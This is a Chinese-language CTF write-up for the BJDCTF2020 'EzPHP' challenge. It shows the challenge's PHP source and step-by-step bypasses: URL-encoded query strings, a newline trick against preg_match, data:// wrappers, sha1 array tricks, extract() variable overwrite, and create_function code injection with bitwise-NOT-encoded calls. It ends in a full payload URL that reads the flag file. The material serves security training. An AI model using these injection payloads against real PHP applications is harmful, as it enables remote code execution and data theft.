# \[BJDCTF2020]EzPHP

### \[BJDCTF2020]EzPHP

## 考点

* `$_SERVER` 获取HTTP传入参数的脆弱性
* `preg_match`脆弱性
* PHP伪协议bypass 字符串相同限制
* &#x20;create\_function创建匿名函数
* PHP7 取反bypass代码执行

## wp

F12给了提示，`base32`解码得到`1nD3x.php`

<div data-full-width="true">

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

</div>

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

访问得到源码

{% code overflow="wrap" lineNumbers="true" fullWidth="true" %}
```php
 <?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
```
{% endcode %}

<mark style="background-color:red;">第一个</mark>`preg_match`在第15行

`$_SERVER['QUERY_STRING']`返回请求的参数和内容，访问`http://ip:port/1nD3x.php?shana=1&passwd=2`会返回`shana=1&passwd=2`，请求的参数有黑名单

<mark style="background-color:blue;">绕过</mark>`$_SERVER['QUERY_STRING']`不会对传入键值对进行解码，可以用URL编码绕过

<mark style="background-color:red;">第二个</mark>`preg_match`在第20行

GET请求的file参数不包含http或https

<mark style="background-color:red;">第三个</mark>`preg_match`在第21行

GET请求的debu参数必须是aqua\_is\_cute且不是aqua\_is\_cute

<mark style="background-color:blue;">绕过</mark>`preg_match`在非`/s`模式下，会忽略末尾的%0a，所以末尾加上%0a即可

`file=padding&debu=aqua_is_cute`

`%66%69%6c%65=%70%61%64%64%69%6e%67&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a`

<mark style="background-color:red;">第四个</mark>`preg_match`在第29行

$\_REQUEST获取所有GET和POST传入的参数和值，并以数组形式返回。

比如POST请求`http://ip:port/?a=1&d=4 POST b=2`会返回`array(3) { 'a' => string(1) "1" 'd' => string(1) "4" 'b' => string(1) "2" }`要求请求的值不含有英文字符

<mark style="background-color:blue;">绕过</mark>$\_REQUEST获取的参数默认POST优先级大于GET，所以POST再传入`file=1&debu=2`



<mark style="background-color:red;">第34行</mark>`if`语句要求`file_get_contents($file)`的内容必须为`debu_debu_aqua`

<mark style="background-color:blue;">绕过</mark>这个有两种方式绕过，一个是`php://input` 加POST `debu_debu_aqua` ，很明显不行

另一个就是`file=data://text/plain,debu_debu_aqua&debu=aqua_is_cute`

%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a



<mark style="background-color:red;">第38行</mark>`if`语句要求传入的shana和passwd值不同且sha1相同

<mark style="background-color:blue;">绕过</mark>用数组绕过

`file=data://text/plain,debu_debu_aqua&debu=aqua_is_cute&passwd[]=1&shana[]=2`

`%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%70%61%73%73%77%64[]=%31&%73%68%61%6e%61[]=%32`

这里不需要再POST参数，因为GET传的是数组，<mark style="background-color:red;">第四个</mark>`preg_match`的$value也是个数组，`preg_match`遇到数组会报错

然后`extract($_GET["flag"]);`存在变量覆盖



<mark style="background-color:red;">第五个</mark>`preg_match`在第45行 i不区分大小写 s视为单行，匹配换行符 D让$总是匹配字符串的末尾

$arg有黑名单，$code不能由纯英文数字组成，必须形如var\_dump print\_r

这里使用变量覆盖对$code和$arg赋值

```
$code('', $arg);
```

这种形式就是create\_function()创建匿名函数，它会创建一个函数名为`\000lambda_(count(anonymous_functions)++)`，如`\000lambda_1`，的匿名函数，第一个参数为匿名函数的参数，第二个函数为代码

```php
create_function('$a,$b', $arg)

eval(
\000lambda_1($a,$b){
    $arg
}
)
```

$arg的黑名单有pi \* sess head 根据<mark style="background-color:purple;">无参RCE</mark>的思路能用的只剩get\_defined\_vars()

根据代码执行还可以用取反

所以在本题就是code=create\_function  arg=}var\_dump(get\_defined\_vars());//

或者arg=}(\~%8F%97%8F%96%91%99%90)();//

```
eval(
\000lambda_1(){
    }var_dump(get_defined_vars());//
}
)
```

`file=data://text/plain,debu_debu_aqua&debu=aqua_is_cute&passwd[]=1&shana[]=2&flag[code]=create_function&flag[arg]=}var_dump(get_defined_vars());//`

`%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%70%61%73%73%77%64[]=%31&%73%68%61%6e%61[]=%32&%66%6c%61%67[%63%6f%64%65]=create_function&%66%6c%61%67[%61%72%67]=}var_dump(get_defined_vars());//`

<figure><img src="../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

读取rea1fl4g.php

`readfile('rea1fl4g.php')`取反

{% code overflow="wrap" lineNumbers="true" %}
```
http://31e9b523-a95b-4c3a-8bd6-0a322f1d383f.node4.buuoj.cn:81/1nD3x.php?%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%70%61%73%73%77%64[]=%31&%73%68%61%6e%61[]=%32&%66%6c%61%67[%63%6f%64%65]=create_function&%66%6c%61%67[%61%72%67]=}(~%8D%9A%9E%9B%99%96%93%9A)((~%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//

file=1&debu=2
```
{% endcode %}

## 小结

1. `$_SERVER['QUERY_STRING']`不会对传入键值对进行解码，可以用URL编码绕过
2. create\_function()创建匿名函数，它会创建一个函数名为`\000lambda_(count(anonymous_functions)++)`，如`\000lambda_1`，的匿名函数，第一个参数为匿名函数的参数，第二个函数为代码
3.  伪协议绕过字符串限制，一个是`php://input` 加POST `debu_debu_aqua` ，

    另一个就是`file=data://text/plain,debu_debu_aqua&debu=aqua_is_cute`
4. `preg_match`在非`/s`模式下，会忽略末尾的%0a
5. `preg_match`传入数组会报错
